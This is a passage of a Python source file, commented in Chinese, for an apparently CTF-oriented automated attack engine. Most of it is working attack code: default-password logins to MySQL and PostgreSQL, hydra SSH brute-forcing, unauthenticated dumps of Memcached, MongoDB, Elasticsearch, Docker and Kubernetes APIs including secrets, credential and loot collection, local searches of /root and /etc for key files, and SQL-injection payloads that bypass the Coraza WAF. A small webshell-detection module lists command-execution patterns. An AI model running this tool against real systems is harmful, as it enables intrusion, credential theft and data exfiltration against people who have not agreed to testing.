                    log(f"MySQL: {user}:{pwd or '(空)'}", "hit"); save("creds", f"mysql://{user}@{target}:{port}", loot)
                    # 搜索flag
                    dbs, _, _ = sh(f"mysql -h {target} -P {port} -u {user} -p'{pwd}' -e 'SHOW DATABASES' 2>&1", 5)
                    for db in re.findall(r"(\w+)", dbs):
                        if db in ("information_schema","mysql","performance_schema","sys"): continue
                        tables, _, _ = sh(f"mysql -h {target} -P {port} -u {user} -p'{pwd}' -e \"SHOW TABLES FROM {db}\" 2>&1", 5)
                        for tbl in re.findall(r"(\w+)", tables):
                            data, _, _ = sh(f"mysql -h {target} -P {port} -u {user} -p'{pwd}' -e \"SELECT * FROM {db}.{tbl} LIMIT 10\" 2>&1", 5)
                            for flag in extract_flags(data):
                                log(f"  MySQL flag: {flag}", "hit"); save("flags", flag, loot)
                    return

    @staticmethod
    def ftp(target, port, loot):
        out, _, _ = sh(f"timeout 5 ftp -inv {target} {port} << 'EOF'\nuser anonymous anonymous@\nls\nquit\nEOF", 10)
        if "230" in out:
            log(f"FTP匿名: {target}:{port}", "hit"); save("ftp_anon", out[:1000], loot)

    @staticmethod
    def ssh_brute(target, loot):
        users = f"{TK}/wordlists/usernames.txt"; pwds = f"{TK}/wordlists/passwords.txt"
        out, _, _ = sh(f"hydra -L {users} -P {pwds} ssh://{target} -t 4 -f 2>&1 | grep successfully", 180)
        if out.strip(): log(f"SSH弱口令: {out.strip()}", "hit"); save("creds", out.strip(), loot)

    @staticmethod
    def mongodb(target, port, loot):
        out, _, _ = sh(f"mongosh --host {target} --port {port} --eval 'db.adminCommand({{listDatabases:1}})' 2>&1", 5)
        if "databases" in out: log(f"MongoDB未授权: {target}:{port}", "hit"); save("mongodb", out[:1000], loot)

    @staticmethod
    def memcached(target, port, loot):
        try:
            import socket as sock
            s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, int(port)))
            s.send(b"stats\r\n")
            data = s.recv(4096).decode(errors="ignore")
            s.close()
            if "STAT pid" in data:
                log(f"Memcached未授权: {target}:{port}", "hit")
                save("memcached", data[:1000], loot)
                # dump all keys
                s2 = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
                s2.settimeout(3)
                s2.connect((target, int(port)))
                s2.send(b"stats cachedump 1 100\r\n")
                keys_data = s2.recv(8192).decode(errors="ignore")
                s2.close()
                for km in re.finditer(r"ITEM (\S+)", keys_data):
                    key = km.group(1)
                    s3 = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
                    s3.settimeout(3)
                    s3.connect((target, int(port)))
                    s3.send(f"get {key}\r\n".encode())
                    val = s3.recv(4096).decode(errors="ignore")
                    s3.close()
                    if "flag" in val.lower():
                        log(f"  Memcached flag: {key}", "hit"); save("flags", val.strip(), loot)
        except: pass

    @staticmethod
    def elasticsearch(target, port, loot):
        for path in ["/_cat/indices","/_search?q=*","/_nodes","/_cluster/health"]:
            body, code, _ = http_get(f"http://{target}:{port}{path}", 3)
            if code == 200 and len(body) > 50:
                log(f"Elasticsearch: {target}:{port}{path}", "hit")
                save("elasticsearch", body[:2000], loot)
                for flag in extract_flags(body):
                    log(f"  ES flag: {flag}", "hit"); save("flags", flag, loot)
                break

    @staticmethod
    def docker_api(target, port, loot):
        for path in ["/containers/json","/images/json","/version","/info"]:
            body, code, _ = http_get(f"http://{target}:{port}{path}", 3)
            if code == 200 and ("Id" in body or "Containers" in body):
                log(f"Docker API: {target}:{port}{path}", "hit")
                save("docker_api", body[:2000], loot)
                break

    @staticmethod
    def k8s_api(target, port, loot):
        for path in ["/api/v1/namespaces","/api/v1/secrets","/apis","/version"]:
            body, code, _ = http_get(f"https://{target}:{port}{path}", 3)
            if code == 200 and ("kind" in body or "apiVersion" in body):
                log(f"K8s API: {target}:{port}{path}", "hit")
                save("k8s_api", body[:2000], loot)
                for flag in extract_flags(body):
                    log(f"  K8s flag: {flag}", "hit"); save("flags", flag, loot)
                break

    @staticmethod
    def postgresql(target, port, loot):
        for user in ["postgres","admin","root"]:
            for pwd in ["","postgres","admin","root","123456","password"]:
                out, _, rc = sh(f"PGPASSWORD='{pwd}' psql -h {target} -p {port} -U {user} -d postgres -c 'SELECT 1' 2>&1", 5)
                if rc == 0:
                    log(f"PostgreSQL: {user}:{pwd or '(empty)'}", "hit")
                    save("creds", f"postgresql://{user}@{target}:{port}", loot)
                    # search for flags
                    out2, _, _ = sh(f"PGPASSWORD='{pwd}' psql -h {target} -p {port} -U {user} -d postgres -c \"SELECT table_name FROM information_schema.tables WHERE table_schema='public'\" 2>&1", 5)
                    save("pg_tables", out2[:2000], loot)
                    return

# ═══════════════════════════════════════════════
# Flag提取器
# ═══════════════════════════════════════════════
class FlagHunter:
    @staticmethod
    def local(loot):
        log("本地Flag搜索")
        # search common flag locations
        search_paths = ["/", "/home", "/var", "/tmp", "/opt", "/root", "/srv", "/etc"]
        for sp in search_paths:
            out, _, _ = sh(f"find {sp} -maxdepth 4 \\\\( -iname '*flag*' -o -iname '*ctf*' -o -iname '*key*' \\\\) -type f 2>/dev/null | grep -v '/proc/\\\\|/sys/\\\\|\\\\.pyc\\\\|__pycache__' | head -10", 10)
            for fpath in out.strip().split("\\n"):
                fpath = fpath.strip()
                if fpath and os.path.isfile(fpath):
                    try:
                        content = open(fpath, errors="ignore").read(10000)
                        for flag in extract_flags(content):
                            log(f"  Flag文件: {fpath} -> {flag}", "hit"); save("flags", flag, loot)
                    except: pass
        # env vars
        for line in os.popen("env 2>/dev/null").read().split("\\n"):
            for flag in extract_flags(line): log(f"  Flag环境变量: {flag}", "hit"); save("flags", flag, loot)
        # database files
        for db in ["/var/lib/mysql", "/var/lib/redis", "/data/db"]:
            if os.path.exists(db):
                out, _, _ = sh(f"find {db} -maxdepth 2 -type f -name '*.rdb' -o -name '*.sql' -o -name '*.sqlite' 2>/dev/null | head -5", 5)
                for fpath in out.strip().split("\\n"):
                    fpath = fpath.strip()
                    if fpath:
                        try:
                            content = open(fpath, errors="ignore").read(50000)
                            for flag in extract_flags(content):
                                log(f"  Flag(DB): {fpath} -> {flag}", "hit"); save("flags", flag, loot)
                        except: pass

    @staticmethod
    def from_loot(loot):
        log("从战利品提取Flag")
        for fpath in Path(loot).rglob("*.txt"):
            try:
                content = fpath.read_text(errors="ignore")
                for flag in extract_flags(content):
                    log(f"  Flag战利品: {fpath.name} -> {flag}", "hit"); save("flags_extracted", flag, loot)
            except: pass

# ═══════════════════════════════════════════════
# AWD防御模块
# ═══════════════════════════════════════════════
class Defense:
    @staticmethod
    def webshell_scan(path="/"):
        """扫描Webshell"""
        log(f"Webshell扫描: {path}")
        patterns = [r"system\s*\(", r"exec\s*\(", r"passthru\s*\(", r"eval\s*\(\s*base64",
                    r"assert\s*\(", r"shell_exec\s*\(", r"popen\s*\(", r"proc_open\s*\(",
                    r"Runtime\.getRuntime\(\)\.exec", r"_$$ND_FUNC\$$"]
        found = []
        for root, dirs, files in os.walk(path):
            for f in files:
                if f.endswith((".php",".jsp",".jspx",".asp",".aspx",".py",".rb")):
                    fpath = os.path.join(root, f)
                    try:
                        content = open(fpath, errors="ignore").read(50000)
                        for pat in patterns:
                            if re.search(pat, content, re.I):
                                found.append(fpath); log(f"  Webshell: {fpath}", "hit"); break
                    except: pass
        return found

    @staticmethod
    def file_integrity(path="/var/www"):
        """文件完整性监控基线"""
        log(f"文件完整性基线: {path}")
        hashes = {}
        for root, dirs, files in os.walk(path):
            for f in files:
                fpath = os.path.join(root, f)
                try:
                    h = hashlib.sha256(open(fpath,"rb").read()).hexdigest()
                    hashes[fpath] = h
                except: pass
        save_json("file_hashes", hashes, f"{LOOT}/defense")
        log(f"  基线: {len(hashes)} 文件")
        return hashes

    @staticmethod
    def check_integrity(path="/var/www", baseline_file=None):
        """检查文件完整性变化"""
        if not baseline_file: return []
        with open(baseline_file) as f: baseline = json.load(f)
        changed = []
        for fpath, old_hash in baseline.items():
            try:
                new_hash = hashlib.sha256(open(fpath,"rb").read()).hexdigest()
                if new_hash != old_hash:
                    changed.append(fpath); log(f"  文件变更: {fpath}", "warn")
            except: pass
        return changed

# ═══════════════════════════════════════════════
# 主引擎
# ═══════════════════════════════════════════════
class Engine:
    def __init__(self, target, args=None):
        self.ti = normalize_target(target)
        self.target = self.ti["host"]
        self.base_url = self.ti["base_url"]
        self.args = args or argparse.Namespace(mode="full",web_only=False,no_brute=False,
            no_local_flags=False,allow_destructive=False,workers=20,timeout=8,cookie="",header=[],proxy="")
        global TIMEOUT; TIMEOUT = self.args.timeout
        self.loot = f"{LOOT}/auto/{time.strftime('%Y%m%d_%H%M%S')}_{self.target.replace('/','_').replace(':','_')}"
        os.makedirs(self.loot, exist_ok=True)
        global LOG; LOG = f"{self.loot}/engine.log"
        self.findings = []

    def run(self):
        t0 = time.time()
        log(f"{'='*60}")
        log(f"  CTF Engine v6 — 目标: {self.target}")
        log(f"  输出: {self.loot}")
        log(f"{'='*60}")

        # Phase 1: 网络侦察
        log(f"\n{'─'*60}\nPhase 1: 网络侦察\n{'─'*60}")
        if self.args.web_only and self.base_url:
            services = {}; http_urls = [self.base_url]
        else:
            services = Recon.scan(self.target, self.loot)
            http_urls = Recon.find_http(self.target, services.keys(), self.loot)
            if self.base_url and self.base_url not in http_urls: http_urls.insert(0, self.base_url)

        # Phase 2: 服务利用
        log(f"\n{'─'*60}\nPhase 2: 服务利用\n{'─'*60}")
        for port, svc in services.items():
            s = svc["svc"].lower()
            if "redis" in s: SvcExploit.redis(self.target, port, self.loot)
            elif "mysql" in s or "maria" in s: SvcExploit.mysql(self.target, port, self.loot)
            elif "ftp" in s: SvcExploit.ftp(self.target, port, self.loot)
            elif "mongo" in s: SvcExploit.mongodb(self.target, port, self.loot)
            elif "memcache" in s: SvcExploit.memcached(self.target, port, self.loot)
            elif "elastic" in s or "es" == s: SvcExploit.elasticsearch(self.target, port, self.loot)
            elif "postgres" in s: SvcExploit.postgresql(self.target, port, self.loot)
        if not self.args.no_brute and any("ssh" in s["svc"].lower() for s in services.values()):
            SvcExploit.ssh_brute(self.target, self.loot)

        # Phase 2.5: Docker/K8s API探测
        for port in [2375,2376,6443,8080,10250,10255]:
            if port not in services:
                SvcExploit.docker_api(self.target, port, self.loot)
                SvcExploit.k8s_api(self.target, port, self.loot)

        # Phase 3: Web攻击
        for url in http_urls:
            log(f"\n{'─'*60}\nPhase 3: Web攻击 — {url}\n{'─'*60}")
            fp = Recon.fingerprint(url, self.loot)
            log(f"指纹: {fp}")
            endpoints, crawl = Discovery.discover(url, self.loot)
            cats = Discovery.categorize(endpoints, crawl)

            ctx = {"target":self.target, "url":url, "loot":self.loot,
                   "endpoints":endpoints, "cats":cats, "crawl":crawl, "args":self.args}

            # 运行所有插件
            log("\n漏洞检测+自动利用")
            for plugin in PLUGINS:
                if plugin.match(ctx):
                    try:
                        findings = plugin.detect(ctx)
                        self.findings.extend(findings)
                        save(f"plugin_{plugin.name}", json.dumps([asdict(f) for f in findings], indent=2, default=str), self.loot)
                    except Exception as e:
                        log(f"  插件{plugin.name}异常: {e}", "err")

        # Phase 4: Flag提取
        log(f"\n{'─'*60}\nPhase 4: Flag提取\n{'─'*60}")
        if not self.args.no_local_flags: FlagHunter.local(self.loot)
        FlagHunter.from_loot(self.loot)

        # 汇总
        self._summary(time.time()-t0)

    def _summary(self, elapsed):
        log(f"\n{'='*60}")
        log(f"  攻击完成 — 耗时 {elapsed:.0f}秒")
        log(f"{'='*60}")
        log(f"目标: {self.target}")
        log(f"漏洞: {len(self.findings)} 个")

        # 按严重等级统计
        by_sev = {}
        for f in self.findings:
            s = f.severity.value if hasattr(f.severity, 'value') else str(f.severity)
            by_sev[s] = by_sev.get(s, 0) + 1
        for s in ["critical","high","medium","low","info"]:
            if s in by_sev:
                log(f"  [{s.upper()}] {by_sev[s]}")

        by_type = {}
        for f in self.findings:
            t = f.type; by_type[t] = by_type.get(t,0)+1
        for t,c in sorted(by_type.items(), key=lambda x:-x[1]):
            log(f"  {t}: {c}")

        # 输出结构化结果
        save_json("findings", [asdict(f) for f in self.findings], self.loot)

        # 读取所有flag
        all_flags = set()
        flags_files = [f"{self.loot}/flags.txt", f"{self.loot}/flags_gui.txt", f"{self.loot}/flags_extracted.txt"]
        for ff in flags_files:
            if os.path.exists(ff):
                with open(ff) as f:
                    for line in f:
                        for flag in extract_flags(line):
                            all_flags.add(flag.strip())

        # 从所有loot文件中再扫一遍
        for fpath in Path(self.loot).rglob("*.txt"):
            try:
                content = fpath.read_text(errors="ignore")
                for flag in extract_flags(content):
                    all_flags.add(flag.strip())
            except: pass

        if all_flags:
            log(f"\n发现的Flag ({len(all_flags)}个):")
            for flag in sorted(all_flags):
                log(f"  {flag}")
            # 保存汇总flag文件
            with open(f"{self.loot}/flags_all.txt", "w") as f:
                for flag in sorted(all_flags):
                    f.write(flag + "\n")

        # 生成文本报告
        self._generate_report(elapsed, all_flags, by_sev, by_type)

        log(f"\n结果目录: {self.loot}")
        log(f"报告文件: {self.loot}/report.txt")
        log(f"{'='*60}")

    def _generate_report(self, elapsed, flags, by_sev, by_type):
        """生成可读的文本报告"""
        lines = []
        lines.append(f"CTF 攻击报告")
        lines.append(f"{'='*60}")
        lines.append(f"目标: {self.target}")
        lines.append(f"时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"耗时: {elapsed:.0f}秒")
        lines.append(f"模式: {self.args.mode}")
        lines.append("")

        lines.append(f"漏洞统计 ({len(self.findings)}个)")
        lines.append(f"{'─'*40}")
        for s in ["critical","high","medium","low","info"]:
            if s in by_sev:
                lines.append(f"  {s.upper():10s} {by_sev[s]}")
        lines.append("")

        if self.findings:
            lines.append(f"漏洞详情")
            lines.append(f"{'─'*40}")
            for i, f in enumerate(self.findings, 1):
                sev = f.severity.value if hasattr(f.severity, 'value') else str(f.severity)
                lines.append(f"[{i}] [{sev.upper()}] {f.type}")
                lines.append(f"    URL: {f.url}{f.path}")
                if f.param: lines.append(f"    参数: {f.param}")
                lines.append(f"    置信度: {f.confidence:.0%}")
                if f.evidence: lines.append(f"    证据: {f.evidence[:150]}")
                lines.append("")

        if flags:
            lines.append(f"Flag列表 ({len(flags)}个)")
            lines.append(f"{'─'*40}")
            for flag in sorted(flags):
                lines.append(f"  {flag}")
            lines.append("")

        # 读取发现的凭证
        creds_file = f"{self.loot}/creds.txt"
        if os.path.exists(creds_file):
            lines.append(f"发现的凭证")
            lines.append(f"{'─'*40}")
            with open(creds_file) as f:
                for line in f:
                    if line.strip(): lines.append(f"  {line.strip()}")
            lines.append("")

        # 读取webshell
        webshell_file = f"{self.loot}/webshells.txt"
        if os.path.exists(webshell_file):
            lines.append(f"Webshell")
            lines.append(f"{'─'*40}")
            with open(webshell_file) as f:
                for line in f:
                    if line.strip(): lines.append(f"  {line.strip()}")
            lines.append("")

        lines.append(f"{'='*60}")
        lines.append(f"结果目录: {self.loot}")

        report = "\n".join(lines)
        with open(f"{self.loot}/report.txt", "w") as f:
            f.write(report)
        log(f"报告已生成: report.txt")

# ═══════════════════════════════════════════════
# 入口
# ═══════════════════════════════════════════════
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Automation Engine v6")
    parser.add_argument("target", help="Target IP/URL")
    parser.add_argument("--mode", choices=["fast","full","stealth"], default="full")
    parser.add_argument("--web-only", action="store_true")
    parser.add_argument("--no-brute", action="store_true")
    parser.add_argument("--no-local-flags", action="store_true")
    parser.add_argument("--allow-destructive", action="store_true")
    parser.add_argument("--workers", type=int, default=20)
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--cookie", default="")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--proxy", default="")
    args = parser.parse_args()
    Engine(args.target, args).run()

# ═══════════════════════════════════════════════
# 新增模块集成 (基于SAS CTF 2026经验)
# ═══════════════════════════════════════════════

@register
class CorazaWAFBypassPlugin(Plugin):
    """Coraza WAF绕过插件 (SAS CTF 2026验证)"""
    name = "coraza_bypass"
    vuln_type = "waf_bypass"
    severity = Severity.HIGH
    
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        
        # 检测Coraza WAF
        test_payload = "' OR 1=1--"
        test_url = f"{url}?id={ue(test_payload)}"
        body, code, _ = http_get(test_url)
        
        if code == 403:
            log("[*] 检测到WAF拦截(403)")
            
            # 测试UNION VALUES绕过
            bypass_payload = "' UNION VALUES('test')--"
            bypass_url = f"{url}?id={ue(bypass_payload)}"
            body, code, _ = http_get(bypass_url)
            
            if code == 200:
                f = Finding(
                    "waf_bypass", ctx["target"], url, 
                    param="id", severity=Severity.HIGH,
                    confidence=0.9,
                    evidence="Coraza WAF绕过: UNION VALUES完全绕过@detectSQLi"
                )
                findings.append(f)
                log("[+] Coraza WAF绕过成功: UNION VALUES", "hit")
                
                # 测试数据提取
                extract_payload = "' UNION VALUES(current_database())--"
                extract_url = f"{url}?id={ue(extract_payload)}"
                body, code, _ = http_get(extract_url)
                
                if code == 200:
                    log(f"[+] 数据库名提取成功: {body[:50]}")
                    save("waf_bypass_db", body[:100], ctx["loot"])
                    
        return findings


@register
class GameAPIPlugin(Plugin):
    """游戏题API绕过插件 (Kolobok模式)"""
    name = "game_api"
    vuln_type = "game_bypass"
    severity = Severity.MEDIUM
    
    GAME_ENDPOINTS = [
        "/game_state", "/game/status", "/api/game",
        "/move", "/move_manual", "/api/move",
        "/reset", "/reset_game", "/api/reset",
        "/get_flag", "/flag", "/api/flag",
        "/submit", "/submit_kernel", "/api/submit",
    ]
    
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        
        # 发现游戏API端点
        discovered = []
        for endpoint in self.GAME_ENDPOINTS:
            test_url = f"{url}{endpoint}"
            body, code, _ = http_get(test_url)
            
            if code in [200, 405]:
                discovered.append(f"{endpoint} (HTTP {code})")
                log(f"[*] 发现游戏API: {endpoint}")
                
        if discovered:
            f = Finding(
                "game_api", ctx["target"], url,
                severity=Severity.MEDIUM,
                confidence=0.8,
                evidence=f"发现游戏API端点: {', '.join(discovered[:3])}"
            )
            findings.append(f)
            
            # 检查是否可绕过kernel sandbox
            for endpoint in ["/move_manual", "/api/move"]:
                test_url = f"{url}{endpoint}"
                body, code, _ = http_post(test_url, {"dx": 1, "dy": 0})
                
                if code == 200:
                    f = Finding(
                        "game_sandbox_bypass", ctx["target"], url,
                        severity=Severity.HIGH,
                        confidence=0.9,
                        evidence=f"可绕过kernel sandbox: {endpoint} 直接移动"
                    )
                    findings.append(f)
                    log(f"[+] 游戏sandbox绕过: {endpoint}", "hit")
                    save("game_api", f"{endpoint} 可直接调用", ctx["loot"])
                    
        return findings


@register
class PDFLeakPlugin(Plugin):
    """PDF泄露Flag插件"""
    name = "pdf_leak"
    vuln_type = "info_leak"
    severity = Severity.HIGH
    
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        
        # 查找PDF文件
        pdf_paths = [
            "/attachments/", "/files/", "/docs/",
            "/static/", "/download/", "/export/"
        ]
        
        for path in pdf_paths:
            test_url = f"{url}{path}"
            body, code, _ = http_get(test_url)
            
            if code == 200:
                # 提取PDF链接
                pdf_links = re.findall(r'href="([^"]*\.pdf)"', body, re.I)
                for pdf_link in pdf_links:
                    if pdf_link.startswith("/"):
                        pdf_url = f"{url}{pdf_link}"
                    elif pdf_link.startswith("http"):
                        pdf_url = pdf_link
                    else:
                        continue
                        
                    log(f"[*] 发现PDF: {pdf_url}")
                    
                    # 下载PDF
                    pdf_body, pdf_code, _ = http_get(pdf_url)
                    if pdf_code == 200:
                        # 保存PDF
                        pdf_path = f"{ctx['loot']}/leaked.pdf"
                        with open(pdf_path, "wb") as f:
                            f.write(pdf_body.encode())
                            
                        # 提取flag
                        flags = re.findall(
                            r"(?:flag|FLAG|SAS|ctf|CTF)\{[^}]{3,80}\}",
                            pdf_body, re.I
                        )
                        
                        if flags:
                            f = Finding(
                                "pdf_leak", ctx["target"], url,
                                severity=Severity.HIGH,
                                confidence=0.95,
                                evidence=f"PDF泄露flag: {', '.join(flags[:3])}"
                            )
                            findings.append(f)
                            log(f"[+] PDF泄露flag: {flags[0]}", "hit")
                            
                            for flag in flags:
                                save("pdf_leak_flags", flag, ctx["loot"])
                                
        return findings
